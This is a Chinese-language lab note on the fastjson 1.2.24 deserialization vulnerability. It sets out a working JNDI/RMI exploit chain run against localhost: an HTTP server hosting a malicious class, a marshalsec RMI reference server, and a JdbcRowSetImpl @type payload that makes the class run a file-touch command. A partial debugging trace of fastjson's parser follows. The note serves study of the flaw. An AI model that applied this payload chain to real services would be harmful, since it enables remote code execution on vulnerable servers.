# fastjson 1.2.24 反序列化漏洞

## JNDI + RMI

### 启动文件服务器
```bash
python -m http.server 1111
```
该目录下有恶意类。

### 启动 RMI 服务
```bash
/usr/lib/jvm/jdk1.8.0_65/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://localhost:1111/#TouchFile" 2222
```

### 执行 payload
```bash
String s = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://localhost:2222/TouchFile\", \"autoCommit\": true}";
JSONObject jsonObject = JSON.parseObject(s);
```

本地访问 2222 端口的 RMI 服务，RMI 请求 1111 端口的文件。

该文件是个 class，里面带有 `touch /tmp/success` 的命令执行。



## 调试记录

对于带有 `@type` filed 的字段，fastjson 会默认是一个 java class 做类解析和加载。

因此会调用 getter 和 setter 进行赋值。

1. 入口点。
```java
String s = "{\"@type\": \"fastjsonTest.Person\", \"name\": \"Alice\", \"age\": \"18\"}";
JSONObject jsonObject = JSON.parseObject(s);
```

跟进
- JSON.parseObject(s)
- parse(text)
- parse(text, DEFAULT_PARSER_FEATURE)

2. 进入一个静态函数 `parse`
构造一个解析器
```java
DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
Object value = parser.parse();
```
进入解析器
```java
public Object parse() {
        return parse(null);
}
```
调用另一个 `parse`
这个 parse 带一个入参。

3. 开始解析
```java
switch (lexer.token()){
        ...
        case LBRACE:
            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
            return parseObject(object, fieldName);
        ...
}
```

解析到这个字符串是左大括号 `{` 开头，认为是一个对象。

4. 进入 `parseObject`
检测到是 `"` 开头，认为是一个 field。

获得当前字符串，并解析为 key。

并且下一个字符必须是 `:`。

```java
 if (ch == '"') {
    key = lexer.scanSymbol(symbolTable, '"');
    lexer.skipWhitespace();
    ch = lexer.getCurrent();
    if (ch != ':') {
        throw new JSONException("expect ':' at " + lexer.pos() + ", name " + key);
    }
}
```

```java
ch = lexer.getCurrent();
```
获得下一个位置的字符（`“`）。

在 `JSON.java` 中有定义：
```java
public static String           DEFAULT_TYPE_KEY     = "@type";
```

因此，会通过 `if` 判断。

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect))
```

接下来获得用 `"` 包裹的类名，也就是 `fastjsonTest.Person`。
```java
String typeName = lexer.scanSymbol(symbolTable, '"');
```

预判下一个字符是 `,`。
```java
lexer.nextToken(JSONToken.COMMA);
```

如果当前 object 不为空，就生成类并返回。
```java
if (object.size() > 0) {
    Object newObj = TypeUtils.cast(object, clazz, this.config);
    this.parseObject(newObj);
    return newObj;
}
```
可惜当前只解析了 `@type`，因此不满足约束。

进入反序列化 `deserializer`。
```java
return deserializer.deserialze(this, clazz, fieldName);
```

再套一层
```java
return deserialze(parser, type, fieldName, 0);
```

再下面我 debug 不动了。





